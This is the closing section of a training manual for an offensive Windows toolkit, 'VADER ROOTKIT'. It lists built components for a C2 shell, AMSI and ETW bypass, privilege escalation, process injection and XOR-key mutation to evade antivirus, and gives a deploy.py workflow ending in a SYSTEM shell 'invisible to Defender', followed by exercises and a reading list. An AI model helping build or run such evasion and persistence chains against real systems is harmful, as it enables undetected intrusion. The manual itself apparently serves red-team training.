- Hooking `NtCreateThread` / `NtCreateThreadEx`
- Periodic thread enumeration + SetThreadContext

The VADER implementation chose **periodic thread enumeration** via VdrWatch (loops every 2 seconds). Trade-off: 2-second window where new threads are unblinded. Acceptable because AMSI initialisation takes longer than 2 seconds in practice, and the VEH handler is already registered process-wide — it just needs breakpoints on new threads to fire.

---

# Part 4: Operational Architecture

> ASF Principle 1+2 combined: understand the whole system, see every path and every block.

## Chapter 10: The Complete Kill Chain

### Current State

```
BUILT:
  Phase 0: C2 shell (vader_shell)           ✓
  Phase 1: AMSI bypass (HWBP)               ✓
  Phase 2: ETW bypass (HWBP)                ✓
  Phase 1+2: Dark room (combined)           ✓
  Phase 3: Privilege escalation (7 vectors) ✓
  Phase 4: Process injection (HOTEL)        ✓  (DLL inject + CREATE_SUSPENDED)
  Recon: 20-section scanner                 ✓  (PE parser + phantom DLL hunting)
  Detection: Automated scan (scan_all.py)   ✓
  Deployment: Automated (deploy.py)         ✓  (--pentest full automation)
  Scanner: User manual (SCANNER_MANUAL.md)  ✓

NOT BUILT:
  Phase 5: Stagers/droppers                 ← Next after Phase 4
  Auto-mutation pipeline                    ← This manual teaches it
```

### How It All Connects

```
┌─────────────────────────────────────────────────────────┐
│                    OPERATOR MACHINE                      │
│                                                          │
│  deploy.py ──→ scan_all.py (verify evasion)             │
│      │                                                   │
│      ├──→ vader_recon.ps1 (20-section recon + PE parser) │
│      │                                                   │
│      ├──→ dark_room.exe (blind AMSI+ETW)                │
│      │         │                                         │
│      │         └──→ vader_inject.exe (propagate blind)  │  ← Phase 4
│      │                   │                               │
│      │                   └──→ Target process is BLIND    │
│      │                                                   │
│      ├──→ osppc.dll / svc_replace.exe (privesc)         │
│      │         │                                         │
│      │         └──→ SYSTEM-level execution               │
│      │                                                   │
│      └──→ vader_listener.py ←── vader_shell (callback)  │
│                                                          │
│  mutate.py ──→ Rotate XOR keys when detected            │  ← Mutation pipeline
│      │                                                   │
│      └──→ scan_all.py (verify new evasion)              │
└─────────────────────────────────────────────────────────┘
```

### The Ideal Chain (Once Everything Is Built)

```
1. Run mutate.py on all components      → Ensure evasion against current sigs
2. python deploy.py --compile           → Build all 7 components (7/7 clean)
3. python deploy.py --status            → Verify all CLEAN against current sigs
4. python deploy.py --pentest           → Full automation: recon → dark room → deploy → evidence
   OR: python deploy.py --pentest --profile radon  → RADON-specific constraints
5. vader_inject.exe --spawn             → Spawn AMSI-blind PowerShell (Phase 4)
   OR: vader_inject.exe <PID>           → Inject into running process
6. Operate from SYSTEM shell            → Full control, invisible to Defender
```

### What Makes This "Complete"

A toolkit is complete when it can:
1. **Evade** — All components pass AV scan (scan_all.py confirms)
2. **Escalate** — Standard user achieves SYSTEM (canary proves it)
3. **Persist** — Survives reboot (service-based vectors auto-restart)
4. **Communicate** — Operator receives shell callback (vader_shell)
5. **Propagate** — Bypass extends to new processes (Phase 4 injection)
6. **Adapt** — When detected, mutation restores evasion (mutate.py)

You have 1-5 built. This manual teaches 6 (auto-mutation pipeline). Phase 4 injection is documented in PHASE4_INVESTIGATION.md and the annotated source in `injection/`.

---

## Exercises Index

| Exercise | Chapter | Topic | Difficulty |
|----------|---------|-------|------------|
| 1.1 | Ch 1 | Identify encoded vs plaintext strings | Beginner |
| 1.2 | Ch 1 | Empirical key rotation test | Beginner |
| 3.1 | Ch 3 | Manual XOR key rotation | Beginner |
| 3.2 | Ch 3 | Build a batch encoder script | Beginner |
| 4.1 | Ch 4 | Apply all 5 mutation techniques | Intermediate |
| 5.1 | Ch 5 | Parse XOR arrays from C source | Intermediate |
| 5.2 | Ch 5 | Decode and re-encode arrays | Intermediate |
| 5.3 | Ch 5 | Compile from Python | Intermediate |
| 5.4 | Ch 5 | Scan from Python | Intermediate |
| 5.5 | Ch 5 | Complete mutation pipeline | Advanced |
| 7.1 | Ch 7 | DR7 bit calculations | Intermediate |
| 7.2 | Ch 7 | Read dark_room.c analysis | Beginner |
| 8.1 | Ch 8 | Windows API research | Beginner |
| 8.2 | Ch 8 | Thread enumeration pseudocode | Intermediate |
| 9.1 | Ch 9 | Design injection DLL | Advanced |
| 9.2 | Ch 9 | Design injector program | Advanced |
| 9.3 | Ch 9 | New thread problem analysis | Advanced |

**Recommended path:**
- Week 1: Exercises 1.1 → 3.2 (understanding + manual XOR work)
- Week 2: Exercises 5.1 → 5.5 (build the mutation pipeline)
- Week 3: Exercises 7.1 → 8.2 (understand injection fundamentals)
- Week 4: Exercises 9.1 → 9.3 (design the injector)

---

## Reading List

### Books
- **Windows Internals, Part 1 & 2** (Russinovich, Solomon, Ionescu) — The bible. How Windows actually works.
- **The Art of Exploitation** (Jon Erickson) — Fundamentals of exploitation.
- **Practical Malware Analysis** (Sikorski, Honig) — Reverse engineering malware. Teaches you to READ what others write.

### Online Resources
- **MITRE ATT&CK T1055** — Process Injection technique documentation (sub-techniques map to the techniques in Chapter 8)
- **Intel Software Developer Manual, Vol 3, Chapter 17** — Debug registers. The primary source.
- **Microsoft Docs: Debugging Functions** — GetThreadContext, SetThreadContext, etc.

### Research Papers
- Endgame (now Elastic): "Ten Process Injection Techniques" — Survey of injection methods
- Itzik Kotler: "Process Injection Techniques — Gotta Catch Them All" — DEF CON talk

### Courses
- SANS SEC760: Advanced Exploit Development
- Sektor7: Malware Development Essentials / Intermediate
- OffSec OSCE3 (OSED module covers shellcode + process manipulation)

---

*VADER ROOTKIT — 22DIV / george wu*
*CSEC Tactical Cyber Operations*
*"Search for knowledge, not for 0-days." — 0x1security*
